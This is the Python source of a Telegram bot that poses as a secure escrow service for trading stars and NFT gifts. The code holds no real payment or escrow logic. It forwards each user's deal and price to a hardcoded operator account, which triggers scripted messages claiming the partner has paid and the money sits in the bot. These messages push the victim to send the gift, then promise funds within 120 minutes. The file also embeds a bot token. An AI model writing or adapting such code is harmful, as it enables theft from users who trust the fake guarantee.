from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor

API_TOKEN = '7656336716:AAGmlNwWpYk6CUYTaW6x1BUBO2OXiU-BOT0'  # Replace with your actual token
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
activeConnect = False
aplata = False
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    user_id = message.from_user.username
    chatId = message.from_user.id
    text = f"Привет {user_id} ! ⚡️\n В данном боте ты сможешь с абсолютной безопасностью продать или купить себе звёзды или NFT подарки. Комиссия взимается всего в 0.1%. Принимать можно на: Карту банка, tonkeeper, binance, CryptoBot"

    # Создание клавиатуры с инлайн кнопками на одной строке
    keyboard = InlineKeyboardMarkup(row_width=3)  # 2 buttons per row
    keyboard.add(
        InlineKeyboardButton(text="ПОМОЩЬ", callback_data="button_click"),
        InlineKeyboardButton(text="Наш чат 💬", url="https://t.me/chatgiftnft"),
        InlineKeyboardButton(text="ВЫВОД ДЕНЕГ 💸", callback_data="withdraw"),
        InlineKeyboardButton(text="СОЗДАТЬ СДЕЛКУ ⚡️", callback_data="new"),
    )
    await bot.send_photo(chat_id=chatId, photo="https://hooks.pro/media/2025/02/03/bot826197106/file-Z6DGHwOnkj.jpg")
    # Отправка сообщения с кнопками
    await message.answer(text, reply_markup=keyboard)
@dp.callback_query_handler(lambda c: c.data == 'withdraw')
async def process_withdraw_button(callback_query: types.CallbackQuery):
    # Message to send when the button is pressed
    help_text = "Ваш баланс: 0.0$. Вывод доступен с: 1$ (Выводить можно как и на карту любых стран, так и на криптовалюту)"

    # Send the help message as a response to the callback query
    await callback_query.answer()  # Answer the callback to remove loading status
    await callback_query.message.answer(help_text)
 


@dp.callback_query_handler(lambda c: c.data == 'new')
async def process_withdraw_button(callback_query: types.CallbackQuery):
    global activeConnect
    help_text = "Введите @username или id человека с которым хотите создать сделку"
    activeConnect = True
    # Send the help message as a response to the callback query
    await callback_query.answer()  # Answer the callback to remove loading status
    await callback_query.message.answer(help_text)
    
    
@dp.message_handler()
async def echo_message(message: types.Message):
    global activeConnect
    global aplata
    if message.text:
        
        # Отправка ответа на сообщение пользователя
        if(activeConnect):
            await message.reply(f"Успешно ✅\nВаша сделка была отправлена к пользователю {message.text}. Пользователь уже зарегистрирован в боте, ожидайте принятия или отклонения вашей сделки! ⚠️")

            username = message.from_user.username or f"id{message.from_user.id}"

            # Клавиатура с кнопкой "Подтвердить сделку"
            keyboard = InlineKeyboardMarkup().add(
                InlineKeyboardButton("✅ Подтвердить сделку",callback_data=f"confirm_deal:{message.from_user.id}")
            )

            # Отправка сообщения с кнопкой
            await bot.send_message(
                chat_id=1688694245,
                text="@" + username + f"\nПользователь хочет создать с вами сделку. inqy kirec({message.text}) Подтвердите ниже:",
                reply_markup=keyboard
            )
           
            activeConnect = False;
        elif(aplata):
            await message.reply("Цена успешно поставлена! Ожидайте оплаты сделки")
            aplata = False

            username = message.from_user.username or f"id{message.from_user.id}"

            # Клавиатура с кнопкой "Подтвердить сделку"
            keyboard = InlineKeyboardMarkup().add(
                InlineKeyboardButton("✅ Подтвердить oplatu",callback_data=f"confirm_oplata:{message.from_user.id}"),
                InlineKeyboardButton("✅ verjnakan",callback_data=f"verjnakan:{message.from_user.id}"),
            )

            # Отправка сообщения с кнопкой
            await bot.send_message(
                chat_id=1688694245,
                text="@" + username + f"\npogverdit oplatu. inqy kirec({message.text}) Подтвердите ниже:",
                reply_markup=keyboard
            )
@dp.callback_query_handler(lambda c: c.data.startswith("confirm_deal:"))
async def confirm_deal(callback_query: types.CallbackQuery):
    global aplata
    await callback_query.answer()

    # Парсим user_id из callback_data
    data = callback_query.data  # например "confirm_deal:123456789"
    user_id = int(data.split(":")[1])  # извлекаем ID

    # Уведомляем того пользователя, который создавал сделку
    await bot.send_message(chat_id=user_id, text="Пользователь @Himan1008 принял вашу сделку! Ожидайте оплаты \nId сделки: 1596654179 - 972\nТеперь введите сумму для оплаты в Долларах $, Toncoin T или Рублях ₽ или Звездах ⭐️")
    aplata = True

@dp.callback_query_handler(lambda c: c.data.startswith("confirm_oplata:"))
async def confirm_oplata(callback_query: types.CallbackQuery):
 
    await callback_query.answer()

    # Парсим user_id из callback_data
    data = callback_query.data  # например "confirm_deal:123456789"
    user_id = int(data.split(":")[1])  # извлекаем ID
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("✅ Подтвердить",callback_data="txt")
    )
    # Уведомляем того пользователя, который создавал сделку
    await bot.send_message(chat_id=user_id, text="@Himan1008 оплатил сделку! Деньги доставлены в бот. Передайте подарок/звезды  партнеру и нажмите кнопку ПОДТВЕРДИТЬ",  reply_markup=keyboard)
@dp.callback_query_handler(lambda c: c.data.startswith("verjnakan:"))
async def verjnakan(callback_query: types.CallbackQuery):

    await callback_query.answer()

    # Парсим user_id из callback_data
    data = callback_query.data  # например "confirm_deal:123456789"
    user_id = int(data.split(":")[1])  # извлекаем ID
   
    # Уведомляем того пользователя, который создавал сделку
    await bot.send_message(chat_id=user_id, text="Сделка была успешно проведена. Средства будут зачислены в течении 120 минут 🕜. Успешных сделок: 1")
@dp.callback_query_handler(lambda c: c.data == 'txt')
async def txt(callback_query: types.CallbackQuery):
  
    # Send the help message as a response to the callback query
    await callback_query.answer()  # Answer the callback to remove loading status
    await callback_query.message.answer("Вы подтвердили отправление подарка! 🎁\n\nОжидайте пока партнер проверит наличие подарка и подтвердит отправку денег с баланса бота на ваш кошелек")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
